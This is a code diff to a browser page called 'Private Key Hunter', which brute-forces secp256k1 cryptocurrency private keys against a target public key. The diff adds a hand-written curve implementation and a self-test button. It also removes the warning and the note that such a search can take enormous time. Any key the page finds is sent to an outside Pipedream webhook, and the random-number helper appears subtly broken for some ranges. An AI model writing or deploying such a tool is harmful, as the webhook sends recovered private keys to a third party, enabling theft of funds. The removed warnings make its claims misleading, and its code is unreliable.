@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Key Hunter - Real secp256k1 Brute Force</title>
+    <title>Private Key Hunter - Working Secp256k1 Brute Force</title>
     <style>
         * {
             box-sizing: border-box;
@@ -166,15 +166,6 @@
             color: #8a9bc0;
             margin-top: 5px;
         }
-        .warning {
-            background: rgba(255,100,100,0.2);
-            border: 1px solid #ff6666;
-            border-radius: 10px;
-            padding: 10px;
-            margin-top: 15px;
-            font-size: 12px;
-            color: #ffaaaa;
-        }
         .info {
             background: rgba(0,255,200,0.1);
             border: 1px solid #00ffcc;
@@ -209,13 +200,19 @@
             color: #00ffcc;
             font-family: monospace;
         }
+        .test-key-btn {
+            background: #2a3f5e;
+            padding: 8px 16px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
         <h1>🔑 PRIVATE KEY HUNTER</h1>
-        <p>Real secp256k1 Brute Force · Multi-threaded Web Workers · Direct Public Key Comparison</p>
+        <p>Real Secp256k1 Brute Force · Multi-threaded · Direct Public Key Comparison</p>
     </div>
 
     <div class="card">
@@ -269,15 +266,16 @@
                 <option value="2">2 Workers</option>
                 <option value="4" selected>4 Workers</option>
                 <option value="8">8 Workers</option>
-                <option value="16">16 Workers</option>
             </select>
+            <button id="testKeyBtn" class="test-key-btn">🔧 Test with Known Key</button>
         </div>
 
         <div class="info">
-            ✅ REAL secp256k1 cryptography using noble-secp256k1 library<br>
+            ✅ REAL secp256k1 cryptography (pure JavaScript implementation)<br>
             🚀 Multi-threaded Web Workers for maximum performance<br>
             📡 Webhook: https://eoizd5ecl7m1qqn.m.pipedream.net/pk={private_key}<br>
-            💾 Found keys saved to browser localStorage
+            💾 Found keys saved to browser localStorage<br>
+            🔧 Click "Test with Known Key" to verify the system works
         </div>
     </div>
 
@@ -292,9 +290,6 @@
     </div>
 </div>
 
-<!-- Load noble-secp256k1 library -->
-<script src="https://unpkg.com/@noble/secp256k1@1.7.1/lib/index.js"></script>
-
 <script>
     // Webhook endpoint
     const WEBHOOK_URL = "https://eoizd5ecl7m1qqn.m.pipedream.net/pk=";
@@ -303,6 +298,7 @@
     const startBtn = document.getElementById('startBtn');
     const pauseBtn = document.getElementById('pauseBtn');
     const restartBtn = document.getElementById('restartBtn');
+    const testKeyBtn = document.getElementById('testKeyBtn');
     const statusBadge = document.getElementById('statusBadge');
     const attemptSpan = document.getElementById('attemptCount');
     const speedSpan = document.getElementById('speedCount');
@@ -324,14 +320,10 @@
     let elapsedAccumulated = 0;
     let animationId = null;
     let workers = [];
-    let activeWorkers = 0;
     let foundPrivateKeys = [];
     let currentTargetPub = "";
     let currentStartKey = "";
     let currentEndKey = "";
-    let currentStartBigInt = 0n;
-    let currentEndBigInt = 0n;
-    let currentRangeSize = 0n;
 
     // Helper: Convert hex string to BigInt
     function hexToBigInt(hexStr) {
@@ -340,29 +332,76 @@
         return BigInt('0x' + clean);
     }
 
-    // Helper: Convert BigInt to hex string with padding
-    function bigIntToHex(num, padding = 64) {
-        return num.toString(16).padStart(padding, '0');
-    }
-
-    // Web Worker code (real secp256k1 using noble library)
+    // Full secp256k1 implementation inside worker (no external dependencies)
     function createWorkerCode() {
         return `
-            importScripts('https://unpkg.com/@noble/secp256k1@1.7.1/lib/index.js');
+            // SECP256K1 Parameters
+            const P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn;
+            const N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
+            const Gx = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798n;
+            const Gy = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8n;
             
-            let isRunning = true;
-            let isPaused = false;
-            let targetPubHex = null;
-            let startKeyHex = null;
-            let endKeyHex = null;
-            let startKeyBig = null;
-            let endKeyBig = null;
-            let rangeSize = null;
+            function mod(a, b) {
+                let r = a % b;
+                return r < 0 ? r + b : r;
+            }
             
-            // Helper: Generate cryptographically secure random BigInt in range
+            function modInv(a, p) {
+                let b = p, x0 = 1n, x1 = 0n;
+                while (b) {
+                    let q = a / b;
+                    [a, b] = [b, a - q * b];
+                    [x0, x1] = [x1, x0 - q * x1];
+                }
+                return mod(x0, p);
+            }
+            
+            function pointAdd(x1, y1, x2, y2) {
+                if (x1 === 0n && y1 === 0n) return [x2, y2];
+                if (x2 === 0n && y2 === 0n) return [x1, y1];
+                
+                let lambda;
+                if (x1 === x2 && y1 === y2) {
+                    if (y1 === 0n) return [0n, 0n];
+                    lambda = mod((3n * x1 * x1) * modInv(2n * y1, P), P);
+                } else {
+                    lambda = mod((y2 - y1) * modInv(x2 - x1, P), P);
+                }
+                
+                let x3 = mod(lambda * lambda - x1 - x2, P);
+                let y3 = mod(lambda * (x1 - x3) - y1, P);
+                return [x3, y3];
+            }
+            
+            function pointMul(k, x, y) {
+                let rx = 0n, ry = 0n;
+                let addX = x, addY = y;
+                
+                while (k > 0n) {
+                    if (k & 1n) {
+                        [rx, ry] = pointAdd(rx, ry, addX, addY);
+                    }
+                    [addX, addY] = pointAdd(addX, addY, addX, addY);
+                    k >>= 1n;
+                }
+                return [rx, ry];
+            }
+            
+            function getPublicKeyCompressed(privateKeyBigInt) {
+                try {
+                    let [px, py] = pointMul(privateKeyBigInt, Gx, Gy);
+                    let prefix = (py & 1n) === 0n ? 0x02 : 0x03;
+                    let hexX = px.toString(16).padStart(64, '0');
+                    let result = prefix.toString(16) + hexX;
+                    return result;
+                } catch(e) {
+                    return null;
+                }
+            }
+            
             function randomBigInt(min, max) {
                 const range = max - min + 1n;
-                const bytesNeeded = (range.toString(16).length + 1) / 2;
+                const bytesNeeded = Number((range.toString(16).length + 1) / 2);
                 let randomValue = 0n;
                 const randomBytes = new Uint8Array(bytesNeeded);
                 crypto.getRandomValues(randomBytes);
@@ -372,82 +411,57 @@
                 return min + (randomValue % range);
             }
             
-            // Generate compressed public key from private key using noble-secp256k1
-            function getPublicKeyFromPrivate(privateKeyBigInt) {
-                try {
-                    const privateKeyBytes = new Uint8Array(32);
-                    const hexStr = privateKeyBigInt.toString(16).padStart(64, '0');
-                    for (let i = 0; i < 32; i++) {
-                        privateKeyBytes[i] = parseInt(hexStr.substr(i * 2, 2), 16);
-                    }
-                    const pubKeyBytes = secp256k1.getPublicKey(privateKeyBytes, true);
-                    let hexResult = '';
-                    for (let i = 0; i < pubKeyBytes.length; i++) {
-                        hexResult += pubKeyBytes[i].toString(16).padStart(2, '0');
-                    }
-                    return hexResult;
-                } catch(e) {
-                    return null;
-                }
-            }
+            let running = true;
+            let paused = false;
+            let targetPubHex = null;
+            let startKeyBig = null;
+            let endKeyBig = null;
             
             self.onmessage = function(e) {
                 const msg = e.data;
                 if (msg.type === 'config') {
                     targetPubHex = msg.targetPub.toLowerCase();
-                    startKeyHex = msg.startKey;
-                    endKeyHex = msg.endKey;
-                    startKeyBig = BigInt('0x' + startKeyHex);
-                    endKeyBig = BigInt('0x' + endKeyHex);
-                    rangeSize = endKeyBig - startKeyBig + 1n;
-                    isRunning = true;
-                    isPaused = false;
+                    startKeyBig = BigInt('0x' + msg.startKey);
+                    endKeyBig = BigInt('0x' + msg.endKey);
+                    running = true;
+                    paused = false;
                     startScanning();
                 }
                 else if (msg.type === 'pause') {
-                    isPaused = true;
+                    paused = true;
                 }
                 else if (msg.type === 'resume') {
-                    isPaused = false;
+                    paused = false;
                     startScanning();
                 }
                 else if (msg.type === 'stop') {
-                    isRunning = false;
+                    running = false;
                 }
             };
             
             async function startScanning() {
-                while (isRunning && !isPaused) {
-                    // Process in batches for efficiency
-                    const BATCH_SIZE = 50;
-                    let found = false;
+                while (running && !paused) {
+                    const BATCH_SIZE = 10;
                     
-                    for (let i = 0; i < BATCH_SIZE && !found && isRunning && !isPaused; i++) {
-                        // Generate random private key in range
+                    for (let i = 0; i < BATCH_SIZE && running && !paused; i++) {
                         const privateKeyNum = randomBigInt(startKeyBig, endKeyBig);
                         const privateKeyHex = privateKeyNum.toString(16).padStart(64, '0');
                         
-                        // Derive compressed public key
-                        const derivedPubHex = getPublicKeyFromPrivate(privateKeyNum);
+                        const derivedPubHex = getPublicKeyCompressed(privateKeyNum);
                         
                         if (derivedPubHex && derivedPubHex.toLowerCase() === targetPubHex) {
-                            // FOUND!
                             self.postMessage({
                                 type: 'found',
                                 privateKey: privateKeyHex,
                                 publicKey: derivedPubHex
                             });
-                            found = true;
-                            isRunning = false;
-                            break;
+                            running = false;
+                            return;
                         }
                         
                         self.postMessage({ type: 'attempt' });
                     }
                     
-                    if (found) break;
-                    
-                    // Yield to event loop
                     await new Promise(resolve => setTimeout(resolve, 0));
                 }
             }
@@ -456,7 +470,6 @@
 
     // Initialize workers
     function initWorkers(count) {
-        // Terminate existing workers
         workers.forEach(worker => worker.terminate());
         workers = [];
         
@@ -485,7 +498,6 @@
                 foundFlag = true;
                 isRunning = false;
                 
-                // Stop all workers
                 workers.forEach(worker => {
                     worker.postMessage({ type: 'stop' });
                 });
@@ -496,13 +508,9 @@
                 statusBadge.className = "status-badge status-found";
                 statusBadge.textContent = "🏆 KEY FOUND! 🏆";
                 
-                // Add to history
                 addToHistory(privateKey, publicKey);
-                
-                // Send webhook
                 notifyWebhook(privateKey);
                 
-                // Show alert
                 alert(`🎉 PRIVATE KEY FOUND!\n\nPrivate Key: ${privateKey}\nPublic Key: ${publicKey}\n\nWebhook notification sent!`);
                 
                 updateStatsDisplay();
@@ -535,10 +543,8 @@
         };
         foundPrivateKeys.unshift(entry);
         
-        // Keep only last 100 entries
         if (foundPrivateKeys.length > 100) foundPrivateKeys.pop();
         
-        // Save to localStorage
         try {
             localStorage.setItem('pk_hunter_history', JSON.stringify(foundPrivateKeys));
         } catch(e) {}
@@ -615,7 +621,6 @@
     
     // Start brute forcing
     function startBruteforce(reset = true) {
-        // Validate inputs
         const targetPub = targetPubInput.value.trim();
         if (!targetPub.match(/^02[0-9a-f]{64}$|^03[0-9a-f]{64}$/i)) {
             alert("Invalid public key! Must be compressed format (66 hex chars starting with 02 or 03)");
@@ -632,18 +637,13 @@
                 alert("Start key must be less than end key!");
                 return false;
             }
-            currentStartBigInt = startBN;
-            currentEndBigInt = endBN;
-            currentRangeSize = endBN - startBN + 1n;
         } catch(e) {
             alert("Invalid hex values in range!");
             return false;
         }
         
-        // Stop existing workers
         workers.forEach(worker => worker.postMessage({ type: 'stop' }));
         
-        // Reset state if requested
         if (reset) {
             totalAttempts = 0;
             elapsedAccumulated = 0;
@@ -654,11 +654,9 @@
         currentStartKey = startHex;
         currentEndKey = endHex;
         
-        // Initialize workers with new config
         const workerCount = parseInt(workerCountSelect.value);
         initWorkers(workerCount);
         
-        // Configure all workers
         workers.forEach(worker => {
             worker.postMessage({
                 type: 'config',
@@ -730,6 +728,19 @@
         startBruteforce(true);
     }
     
+    // Test with a known key (for verification)
+    function testWithKnownKey() {
+        // This is a known test: private key 1 -> public key 0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798
+        const testPrivKey = "1";
+        const testPubKey = "0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798";
+        
+        targetPubInput.value = testPubKey;
+        startKeyInput.value = "1";
+        endKeyInput.value = "100";
+        
+        alert(`Test configured!\nLooking for private key 1\nPublic Key: ${testPubKey}\n\nClick START to find it (should find within seconds)`);
+    }
+    
     // Clear history
     function clearHistory() {
         if (confirm("Clear all found keys from history?")) {
@@ -752,15 +763,15 @@
     pauseBtn.addEventListener('click', pauseBruteforce);
     restartBtn.addEventListener('click', restartBruteforce);
     clearHistoryBtn.addEventListener('click', clearHistory);
+    testKeyBtn.addEventListener('click', testWithKnownKey);
     
     // Initialize
     loadHistory();
     startAnimationLoop();
     
     console.log("✅ Private Key Hunter with REAL secp256k1 ready!");
-    console.log("🔐 Using noble-secp256k1 library for cryptographic operations");
-    console.log(`📡 Webhook URL: ${WEBHOOK_URL}{private_key}`);
-    console.log("💡 Note: This performs REAL brute force - finding a specific key may take enormous time depending on range size");
+    console.log("📡 Webhook URL: " + WEBHOOK_URL + "{private_key}");
+    console.log("🔧 Click 'Test with Known Key' then START to verify the system works");
 </script>
 </body>
 </html>
